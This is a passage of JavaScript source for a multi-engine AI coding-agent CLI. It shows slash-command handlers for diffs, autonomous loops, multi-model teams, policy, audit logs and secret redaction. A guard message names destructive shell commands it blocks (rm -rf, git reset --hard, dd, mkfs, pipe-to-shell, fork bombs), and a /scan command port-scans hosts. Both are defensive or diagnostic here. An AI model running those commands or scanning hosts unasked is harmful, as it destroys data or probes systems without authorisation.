      else if (cmd === "/scan") { const host = arg || "127.0.0.1"; const COMMON = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9000]; transcript.push({ role: "system", text: "scanning " + host + " (" + COMMON.length + " common TCP ports)…" }); render(); quickScan(host, COMMON).then((open) => { transcript.push({ role: "system", text: open.length ? ("open on " + host + ": " + open.join(", ")) : "no common ports open on " + host }); render(); }); }
      else if (cmd === "/notify") { notify = !notify; transcript.push({ role: "system", text: "completion notifications " + (notify ? "ON — a bell rings (and a desktop notification) when a turn over ~15s finishes, so you can step away" : "off") }); }
      else if (cmd === "/watch") { if (!argstr) transcript.push({ role: "system", text: "usage: /watch <command>  — runs it, and if it fails has " + engine + " fix the code and re-run, up to 5 times (e.g. /watch npm test)" }); else watchFix(argstr); }
      else if (cmd === "/commit") commitChanges();
      else if (cmd === "/diff") {
        const a = (arg || "").trim();
        const staged = a === "--staged" || a === "--cached";
        const file = staged ? "" : a;
        const pathspec = file ? " -- " + JSON.stringify(file) : "";
        const primary = staged ? "git -c color.ui=never diff --cached" : "git -c color.ui=never diff HEAD";
        let d = ""; try { d = _cp.execSync(primary + pathspec, { cwd, encoding: "utf8" }); } catch (_) { try { d = _cp.execSync("git -c color.ui=never diff" + pathspec, { cwd, encoding: "utf8" }); } catch (__) {} }
        if (!d.trim()) transcript.push({ role: "system", text: (staged ? "no staged changes" : file ? "no changes in " + file : "no changes vs HEAD (working tree clean)") });
        else { const files = (d.match(/^diff --git/gm) || []).length, adds = (d.match(/^\+(?!\+\+)/gm) || []).length, dels = (d.match(/^-(?!--)/gm) || []).length; transcript.push({ role: "system", text: (staged ? "staged: " : "") + files + " file" + (files === 1 ? "" : "s") + " changed   " + green("+" + adds) + "  " + red("-" + dels) }); transcript.push({ role: "diff", text: d.slice(0, 24000) }); }
      }
      else if (cmd === "/pin") { if (!arg) transcript.push({ role: "system", text: "usage: /pin <file>  — keeps that file in context on every turn" }); else if (!fs.existsSync(path.resolve(cwd, arg))) transcript.push({ role: "system", text: "no such file: " + arg }); else { pinned.add(arg); transcript.push({ role: "system", text: "pinned " + arg + " — its contents are added to every prompt now (" + pinned.size + " pinned)" }); } }
      else if (cmd === "/unpin") { if (arg && pinned.delete(arg)) transcript.push({ role: "system", text: "unpinned " + arg }); else if (arg === "all") { pinned.clear(); transcript.push({ role: "system", text: "unpinned all" }); } else transcript.push({ role: "system", text: "not pinned: " + arg + "  (/unpin all clears everything)" }); }
      else if (cmd === "/pins") transcript.push({ role: "system", text: pinned.size ? ("pinned files (in context every turn):\n" + [...pinned].map((f) => "  " + f).join("\n")) : "no pinned files — /pin <file> to add one" });
      else if (cmd === "/redact") { redact = !redact; transcript.push({ role: "system", text: "cloud redaction " + (redact ? "ON — secrets (API keys, tokens, private keys) are masked before anything is sent to a cloud engine (claude/opencode); local engine is unaffected" : "off") }); }
      else if (cmd === "/ensemble") { if (!argstr) transcript.push({ role: "system", text: "usage: /ensemble <prompt> — asks every engine, then synthesizes the single best answer" }); else ensembleEngines(argstr); }
      else if (cmd === "/loop") {
        let goal = argstr.trim(), maxRounds = 6;
        const nm = goal.match(/(?:^|\s)-n\s+(\d+)\b/); if (nm) { maxRounds = clampRounds(nm[1], 6); goal = (goal.slice(0, nm.index) + " " + goal.slice(nm.index + nm[0].length)).trim(); }
        if (!goal) { transcript.push({ role: "system", text: "autonomous goal loop — Nexus keeps taking the next step toward a goal until it's done or the round cap.\n  usage: /loop [-n rounds] <goal>   e.g. /loop -n 8 make every button use the shared design tokens\n  the agent ends with GOAL-DONE when complete; stop early with ctrl+c." }); }
        else {
          const block = { role: "nexus", items: [] }; transcript.push(block);
          block.items.push({ type: "text", full: bold("Autonomous loop") + gray("  ·  " + engine + "  ·  up to " + maxRounds + " rounds  ·  ") + cyan(goal), shown: 0 });
          busy = true; busyStart = Date.now(); busyWord = "Looping"; ctl = makeCtl(); scroll = 0; startTick(); render();
          const runStep = async (prompt) => {
            try {
              if (engine === "ollama") { const m = (sess.model && sess.model !== engine) ? sess.model : pickCoderModel(await ollamaTags()); const res = await ollamaExec(m, prompt, "", cwd, aSignal(ctl)); return (res.output || "").trim(); }
              const mdl = (sess.model && sess.model !== engine) ? sess.model : undefined;
              const res = await runEngineTask(engine, prompt, cwd, true, false, null, ctl, mdl);
              let out = (res.output || "").trim(); const proto = ENGINES[engine] && ENGINES[engine].proto;
              if (proto === "gemini-json") { const p = geminiParse(out); if (p && p.text) out = p.text; }
              else if (proto === "codex-json") { const p = codexParse(out); if (p && p.text) out = p.text; }
              return out;
            } catch (e) { return "(error: " + (e && e.message || e) + ")"; }
          };
          (async () => {
            let round = 0, lastNote = "", stopReason = "";
            try {
              while (round < maxRounds) {
                if (ctl && ctl.stopped) { stopReason = "interrupted"; break; }
                round++;
                const card = { type: "tool", id: "lp" + round, name: "Task", label: "round " + round + "/" + maxRounds + " (" + engine + ")", status: "run", start: Date.now() };
                block.items.push(card); render();
                const out = await runStep(loopPrompt(goal, round, maxRounds, lastNote));
                card.status = "ok"; card.end = Date.now();
                block.items.push({ type: "text", full: "\n" + bold(cyan("round " + round)) + "\n" + out.slice(0, 2000), shown: 0 }); render();
                const d = loopDecision(round, maxRounds, out); lastNote = out.slice(-1200);
                if (d.stop) { stopReason = d.reason; break; }
              }
            } catch (e) { block.items.push({ type: "text", full: red("\nloop error: " + (e && e.message || e)), shown: 0 }); }
            block.summary = "loop: " + round + " round" + (round === 1 ? "" : "s") + "  ·  " + (stopReason || "done") + "  ·  " + ((Date.now() - busyStart) / 1000).toFixed(0) + "s";
            if (policy.audit) auditLog(cwd, { engine: "loop", tool: "loop_run", status: (ctl && ctl.stopped) ? "interrupted" : "ok", rounds: round, reason: stopReason });
            busy = false; ctl = null; try { saveSession(); } catch (_) {} maybeAutoCompact(); render();
          })();
        }
      }
      else if (cmd === "/team") {
        const task = argstr.trim();
        if (!task) { transcript.push({ role: "system", text: "multi-model workspace — an architect plans, a builder implements, an independent reviewer checks; each role can be a different model.\n  usage: /team <task>\n  configure roles in .nexus/team.json:  {\"roles\":[{\"role\":\"architect\",\"engine\":\"claude\"},{\"role\":\"builder\",\"engine\":\"codex\",\"model\":\"gpt-5-codex\"},{\"role\":\"reviewer\",\"engine\":\"gemini\"}]}\n  default picks distinct available engines so the reviewer is genuinely independent." }); }
        else {
          let roles, maxRounds = 3; try { const c = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "team.json"), "utf8")); const tw = validateTeam(c, ENGINE_ORDER); if (tw.length) transcript.push({ role: "system", text: "team.json warnings:\n  " + tw.join("\n  ") }); if (c && Array.isArray(c.roles) && c.roles.length) roles = c.roles.map((r) => ({ role: r.role || "member", engine: r.engine || engine, model: r.model || "" })); if (c && c.maxRounds) maxRounds = Math.max(1, Math.min(5, c.maxRounds | 0)); } catch (_) {}
          if (!roles) { const other = engineAvail("claude") && engine !== "claude" ? "claude" : (engine === "claude" ? "ollama" : "claude"); roles = [{ role: "architect", engine: engineAvail("claude") ? "claude" : engine, model: "" }, { role: "builder", engine, model: "" }, { role: "reviewer", engine: other, model: "" }]; }
          roles = roles.filter((r) => r.engine === "ollama" || engineAvail(r.engine));
          if (!roles.length) transcript.push({ role: "system", text: "no available engines for the team — install an AI CLI or run Ollama, then retry" });
          else {
            const block = { role: "nexus", items: [] }; transcript.push(block);
            block.items.push({ type: "text", full: bold("Multi-model workspace") + gray("  ·  ") + roles.map((r) => r.role + "→" + r.engine + (r.model ? ":" + r.model : "")).join(gray(" · ")), shown: 0 });
            const cards = roles.map((r, i) => ({ type: "tool", id: "tm" + i, name: "Task", label: r.role + "(" + r.engine + (r.model ? ":" + r.model : "") + ")", status: "wait", start: Date.now(), detail: r.role }));
            cards.forEach((c) => block.items.push(c));
            busy = true; busyStart = Date.now(); busyWord = "Collaborating"; ctl = makeCtl(); scroll = 0; startTick(); render();
            const setCard = (role, status) => { const c = cards.find((x) => x.label.startsWith(role + "(")); if (c) { c.status = status; if (status !== "run" && status !== "wait") c.end = Date.now(); if (status === "run") c.start = Date.now(); } render(); };
            const runRole = async (r, prompt, autonomous) => {
              try {
                if (r.engine === "ollama") { const m = r.model || pickCoderModel(await ollamaTags()); const res = await ollamaExec(m, prompt, "", cwd, aSignal(ctl)); return (res.output || "").trim(); }
                const res = await runEngineTask(r.engine, prompt, cwd, autonomous, false, null, ctl, r.model || undefined);
                let out = (res.output || "").trim(); const proto = ENGINES[r.engine] && ENGINES[r.engine].proto;
                if (proto === "gemini-json") { const p = geminiParse(out); if (p && p.text) out = p.text; }
                else if (proto === "codex-json") { const p = codexParse(out); if (p && p.text) out = p.text; }
                return out;
              } catch (e) { return "(error: " + (e && e.message || e) + ")"; }
            };
            (async () => {
              try {
                const arch = roles.find((r) => r.role === "architect") || roles[0];
                const build = roles.find((r) => r.role === "builder") || roles[Math.min(1, roles.length - 1)];
                const rev = roles.find((r) => r.role === "reviewer");
                const stopped = () => ctl && ctl.stopped;
                const gitDiff = () => { try { return _cp.execSync("git -c color.ui=never diff HEAD", { cwd, encoding: "utf8" }).slice(0, 6000); } catch (_) { return ""; } };
                const verdictOf = (t) => { const m = String(t).toUpperCase().match(/\b(PASS|FAIL)\b/g); return m ? m[m.length - 1] : ""; }; // last PASS/FAIL wins
                let plan = "";
                if (arch) { setCard(arch.role, "run"); plan = await runRole(arch, "You are the ARCHITECT on a software team. Produce a concise, numbered implementation plan for the task. Do NOT write code — just the plan.\n\nTASK: " + task, false); setCard(arch.role, "ok"); block.items.push({ type: "text", full: "\n" + bold(cyan("architect · " + arch.engine)) + "\n" + plan, shown: 0 }); render(); }
                // build → review, looping until the reviewer says PASS or maxRounds is hit
                let round = 0, verdict = "", feedback = "";
                while (!stopped() && build && round < maxRounds) {
                  round++;
                  const rtag = maxRounds > 1 ? " (round " + round + "/" + maxRounds + ")" : "";
                  setCard(build.role, "run");
                  const built = await runRole(build, "You are the BUILDER on a software team. Implement the plan in this codebase — create/edit files and run commands as needed." + (feedback ? " The reviewer found issues in the previous attempt — FIX them:\n" + feedback : "") + "\n\nTASK: " + task + "\n\nPLAN:\n" + plan, true);
                  setCard(build.role, "ok"); block.items.push({ type: "text", full: "\n" + bold(cyan("builder · " + build.engine + rtag)) + "\n" + built.slice(0, 2200), shown: 0 }); render();
                  if (stopped() || !rev) break;
                  setCard(rev.role, "run");
                  const review = await runRole(rev, "You are an INDEPENDENT REVIEWER. Review the implementation for correctness, security and completeness. List concrete issues, then end with a single line: exactly PASS or FAIL. Do NOT modify files.\n\nTASK: " + task + "\n\nPLAN:\n" + plan + "\n\nDIFF vs HEAD:\n" + (gitDiff() || "(no git diff available)"), false);
                  setCard(rev.role, "ok"); verdict = verdictOf(review);
                  block.items.push({ type: "text", full: "\n" + bold(cyan("reviewer · " + rev.engine + rtag)) + " " + (verdict === "PASS" ? green("PASS") : verdict === "FAIL" ? red("FAIL") : "") + "\n" + review, shown: 0 }); render();
                  if (verdict === "PASS" || !verdict) break; // PASS, or reviewer gave no clear verdict → stop
                  feedback = review;
                }
                if (policy.audit) auditLog(cwd, { engine: "team", tool: "team_run", status: stopped() ? "interrupted" : "ok", verdict: verdict || "n/a", rounds: round, reason: roles.map((r) => r.role + ":" + r.engine).join(",") });
                block.summary = "team " + roles.map((r) => r.engine).join(" → ") + (rev ? "  ·  " + (verdict || "no verdict") + " in " + round + " round" + (round === 1 ? "" : "s") : "") + "  ·  " + ((Date.now() - busyStart) / 1000).toFixed(0) + "s";
              } catch (e) { block.items.push({ type: "text", full: red("\nteam error: " + (e && e.message || e)), shown: 0 }); }
              busy = false; ctl = null; try { saveSession(); } catch (_) {} maybeAutoCompact(); render();
            })();
          }
        }
      }
      else if (cmd === "/bench") { if (!argstr) transcript.push({ role: "system", text: "usage: /bench <prompt> — runs it on each engine and reports a speed / tokens / cost table" }); else benchEngines(argstr); }
      else if (cmd === "/guard") { if (["enforce", "warn", "off"].includes(arg)) { guard = arg; transcript.push({ role: "system", text: "Sentinel guard set to " + arg + (arg === "enforce" ? " — destructive agent commands (rm -rf, git reset --hard, dd, mkfs, pipe-to-shell, fork bombs, …) are blocked" : arg === "warn" ? " — destructive commands are flagged but allowed" : " — destructive-command checks disabled") }); } else transcript.push({ role: "system", text: "Sentinel guard is " + guard + ".  usage: /guard enforce|warn|off  — preflights the local agent's shell commands for destructive intent" }); }
      else if (cmd === "/settings" || cmd === "/options" || cmd === "/config") {
        const v = { engine, model: (sess.model && sess.model !== engine ? sess.model : ""), effort, fallback, style, lean, cowork, costCap, cost: sess.cost, mode: (MODES[mode] && MODES[mode].k) || "auto-accept", guard, policyOrg: policy.org, audit: policy.audit, redact, offline, notify, ctxPct: sess.ctxWindow ? Math.min(100, Math.round((sess.ctxUsed / sess.ctxWindow) * 100)) : null, pins: pinned.size, bgRunning: bgJobs.running() };
        let text = bold("Settings") + gray("   change any option with the command shown");
        for (const s of describeSettings(v)) { text += "\n\n" + bold(cyan(s.group)); for (const r of s.rows) { const gap = " ".repeat(Math.max(2, 20 - r.value.length)); text += "\n  " + r.label.padEnd(24) + bold(r.value) + gap + gray(r.cmd); } }
        transcript.push({ role: "system", text });
      }
      else if (cmd === "/jobs") { const js = bgJobs.list(); if (!js.length) transcript.push({ role: "system", text: "no background jobs — the local agent starts them with run_background{command}, polls with check_background{id}" }); else transcript.push({ role: "system", text: "background jobs:\n" + js.map((j) => "  " + (j.status === "running" ? yellow("● running") : j.status === "killed" ? red("● killed ") : green("● done" + (j.code ? " (" + j.code + ")" : ""))) + " " + gray(j.id) + "  " + oneline(j.command, 44) + gray("  " + j.bytes + "b")).join("\n") }); }
      else if (cmd === "/policy") { const lines = ["protected paths: " + (policy.protectedPaths || []).length + "  (never written/deleted)", "denied commands: " + (policy.deniedCommands || []).length, "max files/turn: " + (policy.maxFilesPerTurn || "unlimited"), "block secret writes: " + (policy.blockSecrets ? "on" : "off"), "network: " + (policy.allowNetwork ? "allowed" : "blocked"), "audit trail: " + (policy.audit ? ".nexus/audit.jsonl (hash-chained)" : "off")]; transcript.push({ role: "system", text: "active security policy" + (policy.org ? " " + yellow("[ORG-ENFORCED — local config can only add restrictions]") : " (edit .nexus/policy.json)") + ":\n  " + lines.join("\n  ") + (policyWarnings(cwd).length ? "\n  " + yellow("config warnings: " + policyWarnings(cwd).join("; ")) : "") + "\n  guard=" + guard + " · redact=" + (redact ? "on" : "off") + " · enforced on the local agent; injected into Claude's instructions" }); }
      else if (cmd === "/audit") {
        if (arg === "verify") { const v = auditVerify(cwd); transcript.push({ role: "system", text: v.empty ? "audit trail is empty — nothing to verify" : v.ok ? green("audit trail intact") + " — " + v.count + " record(s), hash chain verified" : red("audit trail TAMPERED") + " — " + v.reason + " at record #" + v.badLine + " of " + v.count }); }
        else { try { const raw = fs.readFileSync(path.join(cwd, ".nexus", "audit.jsonl"), "utf8").trim().split("\n").filter(Boolean); const last = raw.slice(-12).map((l) => { try { const e = JSON.parse(l); return "  " + gray(e.ts ? e.ts.slice(11, 19) : "") + " " + (e.status === "blocked" ? red("blocked") : e.status === "error" ? yellow("error  ") : green("ok     ")) + " " + e.tool + gray(" " + (e.path || e.cmd || "") + (e.reason ? " — " + e.reason : "")); } catch (_) { return ""; } }).filter(Boolean); const v = auditVerify(cwd); transcript.push({ role: "system", text: (last.length ? "audit trail (last " + last.length + " of " + raw.length + "):\n" + last.join("\n") : "audit trail is empty") + "\n  " + (v.ok ? green("chain verified") : red("CHAIN BROKEN — /audit verify")) + " · /audit verify for details" }); } catch (_) { transcript.push({ role: "system", text: "no audit trail yet (.nexus/audit.jsonl) — records enforced tool actions when policy.audit is on" }); } }
      }
      else if (cmd === "/cowork") { const pp = argstr.split(/\s+/).filter(Boolean);
        if (pp[0] === "off") { cowork = { on: false, strong: "", weak: "", weakKind: "claude" }; transcript.push({ role: "system", text: "cowork off — single-model mode" }); }
        else if (pp.length >= 2 && pp[0] !== pp[1]) { const wk = /^(ollama|local):/i.test(pp[1]) ? "ollama" : "claude"; const wn = pp[1].replace(/^(ollama|local):/i, ""); cowork = { on: true, strong: pp[0], weak: wn, weakKind: wk }; transcript.push({ role: "system", text: "cowork ON — " + pp[0] + " does the coding; " + (wk === "ollama" ? "the FREE local model " + wn : "the cheaper Claude model " + wn) + " handles mechanical work (tests, builds, commit messages, plan steps) when it saves more than the delegation overhead." + (wk === "claude" ? " Claude Code's background model is also pointed at " + wn + ", so " + pp[0] + " burns fewer tokens on summaries/classification." : " (a local weak model is free, so mechanical steps cost nothing — just slower.)") + (engine !== "claude" ? "\n(note: cowork applies to the claude engine — /engine claude)" : "") }); }
        else if (pp.length) transcript.push({ role: "system", text: "cowork needs two DIFFERENT models (same model = normal claude).\nusage: /cowork <strong> <weak>\n  weak can be any cheaper Claude model — haiku · sonnet · opus · fable · a full name like claude-haiku-4-5-20251001\n  or a FREE local model — prefix with ollama: e.g.  /cowork opus ollama:qwen2.5-coder\nexamples:  /cowork opus haiku   ·   /cowork opus sonnet   ·   /cowork claude-opus-4-8 ollama:hermes3" });
        else transcript.push({ role: "system", text: cowork.on ? ("cowork: " + cowork.strong + " (code) + " + (cowork.weakKind === "ollama" ? "local:" : "") + cowork.weak + " (cheap work) — " + impact.delegated + " task(s) delegated so far") : "cowork off.\nusage: /cowork <strong> <weak>  —  weak = haiku|sonnet|opus|fable|<full-name> or ollama:<local-model>\ne.g. /cowork opus haiku · /cowork opus sonnet · /cowork opus ollama:qwen2.5-coder · /cowork off" }); }
      else if (cmd === "/lean") { lean = !lean; transcript.push({ role: "system", text: "lean mode " + (lean ? "ON — Nexus asks the model for minimal output (no preamble/recap), which cuts the expensive OUTPUT tokens" : "off") }); }
      else if (cmd === "/style") { if (arg && styleMap[arg] !== undefined) { style = arg; transcript.push({ role: "system", text: "output style: " + bold(arg) + (arg === "default" ? "" : " — " + styleDir(arg)) + gray("  (applies to every engine)") }); } else transcript.push({ role: "system", text: "output styles (shape HOW the AI works — add your own as .nexus/styles/<name>.md):\n" + Object.keys(styleMap).map((n) => "  " + (n === style ? cyan("● " + n) : "  " + n) + gray(n === "default" ? "" : "  " + styleDir(n).slice(0, 60))).join("\n") + "\n  usage: /style <name>" }); }
      else if (cmd === "/effort") { if (["low", "medium", "high", "xhigh", "max"].includes(arg)) { effort = arg; transcript.push({ role: "system", text: "effort set to " + arg + " — the claude engine uses " + (arg === "low" ? "less thinking (fewer tokens, cheaper; good for mechanical work)" : arg === "high" || arg === "xhigh" || arg === "max" ? "more thinking (better on hard problems, more tokens)" : "the default thinking budget") + (engineCap(engine, "effort") ? "" : " · note: only claude uses effort; " + engine + " ignores it") }); } else if (arg === "off" || arg === "default") { effort = ""; transcript.push({ role: "system", text: "effort reset to the model default" }); } else transcript.push({ role: "system", text: "effort: " + (effort || "default") + ".  usage: /effort low|medium|high  (lower = fewer thinking tokens = cheaper)" }); }
      else if (cmd === "/fallback") { if (arg === "off" || arg === "none") { fallback = ""; transcript.push({ role: "system", text: "fallback model cleared" }); } else if (arg) { fallback = arg; transcript.push({ role: "system", text: "fallback model set to " + arg + " — if the main model is rate-limited or unavailable, the claude engine automatically retries on it" + (engineCap(engine, "fallbackModel") ? "" : " · note: fallback applies to the claude engine") }); } else transcript.push({ role: "system", text: fallback ? ("fallback: " + fallback) : "no fallback set.  usage: /fallback <model>  (e.g. /fallback sonnet) — auto-switches when the main model is rate-limited" }); }
      else if (cmd === "/cheap") { lean = true; effort = "low"; transcript.push({ role: "system", text: "cheap mode ON — lean output + low effort (fewer output & thinking tokens). For maximum savings add a free local worker: /cowork " + (cowork.on ? cowork.strong : "opus") + " ollama:<local-model>  ·  or /engine ollama for fully free." }); }
      else if (cmd === "/estimate") { if (!argstr) transcript.push({ role: "system", text: "usage: /estimate <prompt> — rough token/cost estimate before you send it" }); else if (!PAID[engine]) transcript.push({ role: "system", text: "local engine — free (no token charges)" }); else { const inTok = Math.ceil(argstr.length / 4) + sess.ctxUsed; const outEst = lean ? 400 : 900; const mdl = cowork.on ? cowork.strong : sess.model; const pr = priceOf(mdl); const cost = (inTok / 1e6) * pr.in + (outEst / 1e6) * pr.out; transcript.push({ role: "system", text: "estimate on " + mdl + ": ~" + fmtK(inTok) + " input (your prompt + ~" + fmtK(sess.ctxUsed) + " current context) + ~" + outEst + " output  →  ~$" + cost.toFixed(4) + " (rough; " + (lean ? "lean on" : "add /lean to cut output") + ")" }); } }
      else if (cmd === "/models") {
        transcript.push({ role: "system", text: "checking local models…" }); render();
        ollamaTags().then((ms) => {
          const lines = ENGINE_ORDER.map((e) => {
            const m = ENGINES[e], on = engineAvail(e), cur = e === engine ? "  " + cyan("(current)") : "";
            const cat = e === "ollama" ? (ms.length ? ms.join(", ") : gray("none — `ollama pull qwen2.5-coder`"))
              : (m.models && m.models.length) ? m.models.join(" · ") : gray("configured inside the tool itself");
            return "  " + (on ? green("●") : gray("○")) + " " + e + gray(" · " + m.label) + cur + "\n      " + cat;
          }).join("\n");
          transcript.push({ role: "system", text: "models by engine (● installed) — /model <name> to set · /engine <name> to switch:\n" + lines + "\n  free cowork worker: /cowork opus ollama:<name>" });
          render();
        }).catch(() => { transcript.push({ role: "system", text: "could not reach Ollama for the local model list" }); render(); });
      }
      else if (cmd === "/recent") { try { let files = _cp.execSync("git log -12 --name-only --pretty=format:", { cwd, encoding: "utf8" }); let list = [...new Set(files.split("\n").filter(Boolean))]; if (!list.length) { try { list = [...new Set(_cp.execSync("git ls-files -m -o --exclude-standard", { cwd, encoding: "utf8" }).split("\n").filter(Boolean))]; } catch (_) {} } transcript.push({ role: "system", text: list.length ? ("recently changed files (last commits):\n" + list.slice(0, 30).map((f) => "  " + f).join("\n") + (list.length > 30 ? "\n  … +" + (list.length - 30) + " more" : "") + "\n(tip: /pin one to keep it in context)") : "no changes found" }); } catch (_) { transcript.push({ role: "system", text: "/recent needs a git repo" }); } }
      else if (cmd === "/keys") transcript.push({ role: "system", text: "keys:\n  Enter          send   ·   \\ then Enter = newline\n  Shift+Tab      cycle mode (normal / auto-accept / plan)\n  Ctrl+O         expand tool detail   ·   Ctrl+C  stop turn (again = quit)\n  ↑ / ↓          input history   ·   Tab  complete /command or @path\n  wheel · PgUp/PgDn · Home/End   scroll\n  prefixes:  /command  ·  @file  ·  !shell  ·  #note" });
      else if (cmd === "/version" || cmd === "/about") transcript.push({ role: "system", text: "Nexus (sentinel " + VERSION + ") — the multi-engine AI coding agent. Engines: claude · ollama (local) · opencode. Type / for the command menu." });
      else if (cmd === "/docs" || cmd === "/doc" || cmd === "/help?") { const key = (arg || "").toLowerCase().replace(/^\//, ""); scroll = 0; if (!key) transcript.push({ role: "system", text: "docs — /docs <topic> (or /docs all):\n" + DOC_ORDER.map((k) => "  " + k.padEnd(12) + NEXUS_DOCS[k].title).join("\n") }); else if (key === "all") transcript.push({ role: "system", text: DOC_ORDER.map((k) => "── " + NEXUS_DOCS[k].title + " ──\n" + NEXUS_DOCS[k].body).join("\n\n") }); else { const d = NEXUS_DOCS[key] || Object.entries(NEXUS_DOCS).find(([k, v]) => k.startsWith(key) || v.title.toLowerCase().includes(key))?.[1]; transcript.push({ role: "system", text: d ? (d.title + "\n\n" + d.body) : ("no doc topic '" + key + "' — /docs to list topics") }); } }
      else if (cmd === "/impact") { const BLEND = 6; const avoided = (impact.localTok / 1e6) * BLEND; transcript.push({ role: "system", text: "Impact Receipt (this session):\n  local turns   " + impact.localTurns + "   free · ~" + fmtK(impact.localTok) + " tokens\n  cloud turns   " + impact.cloudTurns + "   ↑" + fmtK(impact.cloudInTok) + " ↓" + fmtK(impact.cloudOutTok) + " tok · $" + impact.cloudCost.toFixed(4) + "\n  cost avoided  ~$" + avoided.toFixed(4) + "   (est. if those local turns had run on the cloud @ ~$" + BLEND + "/M tokens)" + (cowork.on || impact.delegated ? "\n  cowork        " + impact.delegated + " task(s) delegated to " + (cowork.weak || "the weak model") + " · ~$" + impact.coworkSaved.toFixed(4) + " saved" : "") + "\n  net: spent $" + impact.cloudCost.toFixed(4) + ", avoided ~$" + (avoided + impact.coworkSaved).toFixed(4) }); }
      else if (cmd === "/gaps") { try { const files = _cp.execSync("git ls-files", { cwd, encoding: "utf8" }).split("\n").filter(Boolean); const found = []; for (const f of files) { try { if (fs.statSync(path.join(cwd, f)).size > 400000) continue; const lines = fs.readFileSync(path.join(cwd, f), "utf8").split("\n"); for (let i = 0; i < lines.length; i++) { const m = lines[i].match(/\b(TODO|FIXME|HACK|XXX|BUG)\b[:\s-]*(.*)/); if (m) found.push({ file: f, line: i + 1, kind: m[1], text: (m[2] || "").trim().slice(0, 80) }); } } catch (_) {} } if (arg === "plan") { if (!found.length) transcript.push({ role: "system", text: "no gaps to turn into a plan" }); else { plan = found.slice(0, 30).map((g) => ({ text: "resolve " + g.kind + " in " + g.file + ":" + g.line + (g.text ? " — " + g.text : ""), done: false })); savePlan(); transcript.push({ role: "system", text: "turned " + plan.length + " gap(s) into a plan — /plan run to work through them" }); transcript.push({ role: "plan" }); } } else transcript.push({ role: "system", text: found.length ? ("gaps (" + found.length + " TODO/FIXME/HACK/XXX/BUG):\n" + found.slice(0, 40).map((g) => "  " + g.file + ":" + g.line + "  " + g.kind + (g.text ? " " + g.text : "")).join("\n") + (found.length > 40 ? "\n  … and " + (found.length - 40) + " more" : "") + "\n/gaps plan turns these into a checklist") : "no TODO/FIXME/HACK/XXX/BUG markers in tracked files" }); } catch (_) { transcript.push({ role: "system", text: "/gaps needs a git repo (uses git ls-files)" }); } }
      else if (cmd === "/dream") { const conv = transcript.filter((m) => m.role === "user" || m.role === "nexus").slice(-16); if (!conv.length) { transcript.push({ role: "system", text: "nothing to consolidate yet — have a conversation first" }); render(); return; } transcript.push({ role: "user", text: "/dream" }); const block = { role: "nexus", items: [] }; transcript.push(block); scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Dreaming"; ctl = makeCtl(); const card = { type: "tool", id: "dr", name: "Task", label: "Task(consolidate memory)", status: "run", start: Date.now() }; block.items.push(card); startTick(); render(); (async () => {
        const digest = conv.map((m) => m.role === "user" ? "USER: " + m.text : "NEXUS: " + (m.items || []).filter((it) => it.type === "text").map((it) => it.full).join(" ")).join("\n").slice(0, 8000);
        const dreamPrompt = "From this coding session, extract 3-8 durable, reusable facts about THIS project (conventions, gotchas, key files, decisions). Output ONLY bullet points, one per line starting with '- '. No preamble.\n\n" + digest;
        let out = ""; try { out = cowork.on ? await weakChat(dreamPrompt) : await engineAnswer(offline ? "ollama" : engine, dreamPrompt); } catch (_) {}
        const bullets = (out || "").split("\n").map((l) => l.trim()).filter((l) => /^[-*]\s/.test(l)).map((l) => l.replace(/^[*]\s/, "- "));
        card.status = "ok"; card.end = Date.now();
        if (bullets.length) { try { const md = path.join(cwd, ".nexus", "NEXUS.md"); fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); let c = ""; try { c = fs.readFileSync(md, "utf8"); } catch (_) {} if (!/\n##\s*Notes/.test(c)) c += (c && !c.endsWith("\n") ? "\n" : "") + "\n## Notes\n"; const lc = c.toLowerCase(); const added = []; for (const b of bullets) { const key = b.toLowerCase().replace(/[^a-z0-9 ]/g, "").slice(0, 28); if (key.length > 8 && !lc.includes(key)) { c += b + "\n"; added.push(b); } } fs.writeFileSync(md, c); ensureText().full = added.length ? ("consolidated " + added.length + " new fact(s) into .nexus/NEXUS.md:\n\n" + added.join("\n")) : "reviewed the session — everything's already in NEXUS.md"; } catch (e) { ensureText().full = "could not write memory: " + e.message; } } else ensureText().full = "no durable facts found to consolidate.";
        busy = false; ctl = null; try { saveSession(); } catch (_) {} render();
      })(); }
      else if (cmd === "/plan") { const s = arg;
        if (!s) { if (plan.length) transcript.push({ role: "plan" }); else transcript.push({ role: "system", text: "no plan yet — /plan <goal> to create an executable checklist" }); }
        else if (s === "run") runPlan();
        else if (s === "clear") { plan = []; savePlan(); transcript.push({ role: "system", text: "plan cleared" }); }
        else if (s === "add") { const txt = argstr.split(/\s+/).slice(1).join(" "); if (txt) { plan.push({ text: txt, done: false }); savePlan(); transcript.push({ role: "plan" }); } else transcript.push({ role: "system", text: "usage: /plan add <task text>" }); }
        else if (s === "done") { const n = parseInt(argstr.split(/\s+/)[1], 10); if (plan[n - 1]) { plan[n - 1].done = !plan[n - 1].done; savePlan(); transcript.push({ role: "plan" }); } else transcript.push({ role: "system", text: "no task #" + argstr.split(/\s+/)[1] }); }
        else planGen(argstr); }
      else if (cmd === "/git") { try { const br = _cp.execSync("git branch --show-current", { cwd, encoding: "utf8" }).trim(); const st = _cp.execSync("git -c color.ui=never status --porcelain", { cwd, encoding: "utf8" }).trim(); const log = _cp.execSync("git -c color.ui=never log --oneline -8", { cwd, encoding: "utf8" }).trim(); transcript.push({ role: "system", text: "branch: " + (br || "(detached)") + "\n\nstatus:\n" + (st ? st.split("\n").map((l) => "  " + l).join("\n") : "  working tree clean") + "\n\nrecent commits:\n" + log.split("\n").map((l) => "  " + l).join("\n") }); } catch (_) { transcript.push({ role: "system", text: "not a git repo (or git not installed)" }); } }
      else if (cmd === "/blame") { if (!arg) transcript.push({ role: "system", text: "usage: /blame <file>  — shows who last changed each of the first lines" }); else { try { const b = _cp.execSync("git blame -L 1,40 --date=short -- " + JSON.stringify(arg), { cwd, encoding: "utf8" }); transcript.push({ role: "system", text: "blame " + arg + " (first 40 lines):\n" + b.replace(/\n+$/, "") }); } catch (e) { transcript.push({ role: "system", text: "blame failed: " + String(e.message).split("\n")[0] }); } } }
      else if (cmd === "/index") { const n = buildIndex(); transcript.push({ role: "system", text: "indexed " + n + " file(s) → .nexus/index.json. The local engine will now auto-pull the most relevant files into each prompt." }); }
      else if (cmd === "/snippet" || cmd === "/snip") {
